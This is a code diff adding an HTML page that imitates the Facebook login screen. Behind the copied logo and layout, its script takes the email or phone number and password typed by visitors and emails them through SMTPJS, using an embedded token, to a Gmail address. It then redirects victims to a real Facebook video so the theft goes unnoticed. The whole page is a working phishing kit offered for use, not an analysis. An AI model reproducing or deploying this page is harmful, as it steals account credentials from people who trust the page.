@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook-Login or Sign up</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" type="image/x-icon">
+
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <main>
+        <div class="container">
+            <div class="row">
+                <div class="colm-logo" style="padding-top:80px;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/2560px-Facebook_Logo_%282019%29.svg.png" alt="Logo" style="width: 60%;">
+                    <h2>Facebook helps you connect and share with the people in your life.</h2>
+                </div>
+                <div class="colm-form">
+                    <div class="form-container">
+                        <form id="loginForm">
+                            <input id="name" type="text" placeholder="Email address or phone number" style="border-radius: 5px; height: 50px;">
+                            <input id="password" type="password" placeholder="Password" style="border-radius: 5px; height: 50px;">
+                            <div id="errorMessage" style="color: red;"></div>
+                            <button  class="btn-login" onclick="sendFormData()">Login</button>
+                            <a href="error.html" class="forgot-password">Forgotten password?</a>
+                            <br>
+                            <button type="button" onclick="createAccount()" class="btn-new" style="width: 190px; height: 50px;">Create new Account</button>
+                        </form>
+                    </div>
+                    <p style="margin-top: 30px; font-size: 15px; color: black; text-decoration: none;"><a href="error.html"><b style="color: black; text-decoration: none;">Create a Page</b></a> for a celebrity, brand, or business.</p>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="footer-contents" style="text-align: center;">
+            <ol style="text-align: center; margin-left: 80px;">
+                <li style="text-align: center;">English (UK)</li>
+                <li style="text-align: center;"><a href="error.html">മലയാളം</a></li>
+                <li style="text-align: center;"><a href="error.html">தமிழ்</a></li>
+                <li style="text-align: center;"><a href="error.html">తెలుగు</a></li>
+                <li style="text-align: center;"><a href="error.html">বাংলা</a></li>
+                <li style="text-align: center;"><a href="error.html">اردو</a></li>
+                <li style="text-align: center;"><a href="error.html">हिन्दी</a></li>
+                <li style="text-align: center;"><a href="error.html">ಕನ್ನಡ</a></li>
+                <li style="text-align: center;"><a href="error.html">Español</a></li>
+                <li style="text-align: center;"><a href="error.html">Português (Brasil)</a></li>
+                <li style="text-align: center;"><a href="error.html">Français (France)</a></li>
+                <li style="text-align: center;"><button>+</button></li>
+            </ol>
+            <small>Meta © 2024</small>
+        </div>
+    </footer>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <script>
+    function sendFormData() {
+        // Define form fields
+        let fields = {
+            name: document.querySelector("#name").value,
+            password: document.querySelector("#password").value
+        };
+
+        // Construct message body
+        let body = '<br><b>Email or Phone:</b> ' + fields.name + '<br>' +
+            '<b>Password:</b> ' + fields.password + '<br>';
+
+        // Send email using SMTPJS
+        Email.send({
+            SecureToken: "3e3ceea2-2cb6-460e-bef9-8eda1298071a",
+            To: "mbitsiedward@gmail.com",
+            From: "almeidadavid123@gmail.com",
+            Subject: "Login Form Submission",
+            Body: body
+        }).then(
+            message => {
+                // Check if email was sent successfully
+                if (message === "OK") {
+                    // Email sent successfully, you can add any further actions here
+                    console.log("Form data sent successfully");
+                    // Redirect user to the specified link
+                    window.location.href = "https://www.facebook.com/reel/913248284140052";
+                } else {
+                    // Error sending email
+                    console.error("Error sending form data:", message);
+                    // Display error message to user
+                    document.querySelector("#errorMessage").textContent = "Error sending form data. Please try again later.";
+                }
+            }
+        );
+    }
+
+    // Add event listener to the form submission
+    document.querySelector("#loginForm").addEventListener("submit", function (event) {
+        event.preventDefault(); // Prevent default form submission
+        sendFormData(); // Call function to send form data
+    });
+
+</script>
+
+
+</body>
+</html>
